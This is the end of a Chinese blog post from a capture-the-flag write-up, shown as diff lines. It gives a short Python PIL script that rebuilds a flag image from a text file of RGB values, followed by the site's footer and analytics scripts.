+<p>用 python PIL 中的 Image 模块写个脚本还原<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python2.7</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">x = 887</span><br><span class="line">y = 111</span><br><span class="line">im = Image.new(&apos;RGB&apos;,(x,y))</span><br><span class="line">file = open(&apos;ce.txt&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(0,x):</span><br><span class="line">	for j in range(0,y):</span><br><span class="line">		line = file.readline()</span><br><span class="line">		lst = line.split(&apos;,&apos;)</span><br><span class="line">		im.putpixel((i,j),(int(lst[0]),int(lst[1]),int(lst[2])))</span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(&apos;flag.png&apos;)</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://7xqn7l.com1.z0.glb.clouddn.com/SWPUCTF/005.jpg" alt="005.jpg"></p>
+<p>还有几道题，等有空再写吧，这几天事情太多了 = =</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
